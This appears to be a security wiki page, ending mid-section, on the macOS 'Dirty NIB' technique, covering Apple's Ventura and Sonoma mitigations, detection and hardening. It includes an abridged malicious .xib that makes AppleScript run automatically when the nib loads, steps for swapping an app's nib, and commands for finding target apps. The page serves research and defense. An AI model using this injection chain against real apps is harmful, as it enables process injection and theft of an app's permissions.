_body: "# macOS Dirty NIB\n\n{{#include ../../../banners/hacktricks-training.md}}\n\nDirty NIB refers to abusing Interface\
  \ Builder files (.xib/.nib) inside a signed macOS app bundle to execute attacker-controlled logic inside the target process,\
  \ thereby inheriting its entitlements and TCC permissions. This technique was originally documented by xpn (MDSec) and later\
  \ generalized and significantly expanded by Sector7, who also covered Apple’s mitigations in macOS 13 Ventura and macOS\
  \ 14 Sonoma. For background and deep dives, see the references at the end.\n\n> TL;DR\n> • Before macOS 13 Ventura: replacing\
  \ a bundle’s MainMenu.nib (or another nib loaded at startup) could reliably achieve process injection and often privilege\
  \ escalation.  \n> • Since macOS 13 (Ventura) and improved in macOS 14 (Sonoma): first‑launch deep verification, bundle\
  \ protection, Launch Constraints, and the new TCC “App Management” permission largely prevent post‑launch nib tampering\
  \ by unrelated apps. Attacks may still be feasible in niche cases (e.g., same‑developer tooling modifying own apps, or terminals\
  \ granted App Management/Full Disk Access by the user).\n\n\n## What are NIB/XIB files\n\nNib (short for NeXT Interface\
  \ Builder) files are serialized UI object graphs used by AppKit apps. Modern Xcode stores editable XML .xib files which\
  \ are compiled into .nib at build time. A typical app loads its main UI via `NSApplicationMain()` which reads the `NSMainNibFile`\
  \ key from the app’s Info.plist and instantiates the object graph at runtime.\n\nKey points that enable the attack:\n- NIB\
  \ loading instantiates arbitrary Objective‑C classes without requiring them to conform to NSSecureCoding (Apple’s nib loader\
  \ falls back to `init`/`initWithFrame:` when `initWithCoder:` is not available).\n- Cocoa Bindings can be abused to call\
  \ methods as nibs are instantiated, including chained calls that require no user interaction.\n\n\n## Dirty NIB injection\
  \ process (attacker view)\n\nThe classic pre‑Ventura flow:\n1) Create a malicious .xib\n- Add an `NSAppleScript` object\
  \ (or other “gadget” classes such as `NSTask`).\n- Add an `NSTextField` whose title contains the payload (e.g., AppleScript\
  \ or command arguments).\n- Add one or more `NSMenuItem` objects wired via bindings to call methods on the target object.\n\
  \n2) Auto‑trigger without user clicks\n- Use bindings to set a menu item’s target/selector and then invoke the private `_corePerformAction`\
  \ method so the action fires automatically when the nib loads. This removes the need for a user to click a button.\n\nMinimal\
  \ example of an auto‑trigger chain inside a .xib (abridged for clarity):\n```xml\n<objects>\n  <customObject id=\"A1\" customClass=\"\
  NSAppleScript\"/>\n  <textField id=\"A2\" title=\"display dialog \\\"PWND\\\"\"/>\n  <!-- Menu item that will call -initWithSource:\
  \ on NSAppleScript with A2.title -->\n  <menuItem id=\"C1\">\n    <connections>\n      <binding name=\"target\" destination=\"\
  A1\"/>\n      <binding name=\"selector\" keyPath=\"initWithSource:\"/>\n      <binding name=\"Argument\" destination=\"\
  A2\" keyPath=\"title\"/>\n    </connections>\n  </menuItem>\n  <!-- Menu item that will call -executeAndReturnError: on\
  \ NSAppleScript -->\n  <menuItem id=\"C2\">\n    <connections>\n      <binding name=\"target\" destination=\"A1\"/>\n  \
  \    <binding name=\"selector\" keyPath=\"executeAndReturnError:\"/>\n    </connections>\n  </menuItem>\n  <!-- Triggers\
  \ that auto‑press the above menu items at load time -->\n  <menuItem id=\"T1\"><connections><binding keyPath=\"_corePerformAction\"\
  \ destination=\"C1\"/></connections></menuItem>\n  <menuItem id=\"T2\"><connections><binding keyPath=\"_corePerformAction\"\
  \ destination=\"C2\"/></connections></menuItem>\n</objects>\n```\nThis achieves arbitrary AppleScript execution in the target\
  \ process upon nib load. Advanced chains can:\n- Instantiate arbitrary AppKit classes (e.g., `NSTask`) and call zero‑argument\
  \ methods like `-launch`.\n- Call arbitrary selectors with object arguments via the binding trick above.\n- Load AppleScriptObjC.framework\
  \ to bridge into Objective‑C and even call selected C APIs.\n- On older systems that still include Python.framework, bridge\
  \ into Python and then use `ctypes` to call arbitrary C functions (Sector7’s research).\n\n3) Replace the app’s nib\n- Copy\
  \ target.app to a writable location, replace e.g., `Contents/Resources/MainMenu.nib` with the malicious nib, and run target.app.\
  \ Pre‑Ventura, after a one‑time Gatekeeper assessment, subsequent launches only performed shallow signature checks, so non‑executable\
  \ resources (like .nib) weren’t re‑validated.\n\nExample AppleScript payload for a visible test:\n```applescript\nset theDialogText\
  \ to \"PWND\"\ndisplay dialog theDialogText\n```\n\n\n## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)\n\n\
  Apple introduced several systemic mitigations that dramatically reduce the viability of Dirty NIB in modern macOS:\n- First‑launch\
  \ deep verification and bundle protection (macOS 13 Ventura)\n  - On first run of any app (quarantined or not), a deep signature\
  \ check covers all bundle resources. Afterwards, the bundle becomes protected: only apps from the same developer (or explicitly\
  \ allowed by the app) may modify its contents. Other apps require the new TCC “App Management” permission to write into\
  \ another app’s bundle.\n- Launch Constraints (macOS 13 Ventura)\n  - System/Apple‑bundled apps can’t be copied elsewhere\
  \ and launched; this kills the “copy to /tmp, patch, run” approach for OS apps.\n- Improvements in macOS 14 Sonoma\n  -\
  \ Apple hardened App Management and fixed known bypasses (e.g., CVE‑2023‑40450) noted by Sector7. Python.framework was removed\
  \ earlier (macOS 12.3), breaking some privilege‑escalation chains.\n- Gatekeeper/Quarantine changes\n  - For a broader discussion\
  \ of Gatekeeper, provenance, and assessment changes that impacted this technique, see the page referenced below.\n\n> Practical\
  \ implication\n> • On Ventura+ you generally cannot modify a third‑party app’s .nib unless your process has App Management\
  \ or is signed by the same Team ID as the target (e.g., developer tooling).  \n> • Granting App Management or Full Disk\
  \ Access to shells/terminals effectively re‑opens this attack surface for anything that can execute code inside that terminal’s\
  \ context.\n\n\n### Addressing Launch Constraints\n\nLaunch Constraints block running many Apple apps from non‑default locations\
  \ beginning with Ventura. If you were relying on pre‑Ventura workflows like copying an Apple app to a temp directory, modifying\
  \ `MainMenu.nib`, and launching it, expect that to fail on >= 13.0.\n\n\n## Enumerating targets and nibs (useful for research\
  \ / legacy systems)\n\n- Locate apps whose UI is nib‑driven:\n```bash\nfind /Applications -maxdepth 2 -name Info.plist -exec\
  \ sh -c \\\n  'for p; do if /usr/libexec/PlistBuddy -c \"Print :NSMainNibFile\" \"$p\" >/dev/null 2>&1; \\\n   then echo\
  \ \"[+] $(dirname \"$p\") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c \"Print :NSMainNibFile\" \"$p\" )\"; fi; done'\
  \ sh {} +\n```\n- Find candidate nib resources inside a bundle:\n```bash\nfind target.app -type f \\( -name \"*.nib\" -o\
  \ -name \"*.xib\" \\) -print\n```\n- Validate code signatures deeply (will fail if you tampered with resources and didn’t\
  \ re‑sign):\n```bash\ncodesign --verify --deep --strict --verbose=4 target.app\n```\n\n> Note: On modern macOS you will\
  \ also be blocked by bundle protection/TCC when trying to write into another app’s bundle without proper authorization.\n\
  \n\n## Detection and DFIR tips\n\n- File integrity monitoring on bundle resources\n  - Watch for mtime/ctime changes to\
  \ `Contents/Resources/*.nib` and other non‑executable resources in installed apps.\n- Unified logs and process behavior\n\
  \  - Monitor for unexpected AppleScript execution inside GUI apps and for processes loading AppleScriptObjC or Python.framework.\
  \ Example:\n    ```bash\n    log stream --info --predicate 'processImagePath CONTAINS[cd] \".app/Contents/MacOS/\" AND (eventMessage\
  \ CONTAINS[cd] \"AppleScript\" OR eventMessage CONTAINS[cd] \"loadAppleScriptObjectiveCScripts\")'\n    ```\n- Proactive\
  \ assessments\n  - Periodically run `codesign --verify --deep` across critical apps to ensure resources remain intact.\n\
  - Privilege context\n  - Audit who/what has TCC “App Management” or Full Disk Access (especially terminals and management\
  \ agents). Removing these from general‑purpose shells prevents trivially re‑enabling Dirty NIB‑style tampering.\n\n\n##\
  \ Defensive hardening (developers and defenders)\n\n- Prefer programmatic UI or limit what’s instantiated from nibs. Avoid\
  \ including powerful classes (e.g., `NSTask`) in nib graphs and avoid bindings that indirectly invoke selectors on arbitrary\
  \ objects.\n- Adopt the hardened runtime with Library Validation (already standard for modern apps). While this doesn’t\
  \ stop nib injection by itself, it blocks easy native code loading and forces attackers into scripting‑only payloads.\n\
  - Do not request or depend on broad App Management permissions in general‑purpose tools. If MDM requires App Management,\
  \ segregate that context from user‑driven shells.\n- Regularly verify your app bundle’s integrity and make your update mechanisms\
  \ self‑heal bundle resources.\n\n\n## Related reading in HackTricks\n\nLearn more about Gatekeeper, quarantine and provenance\
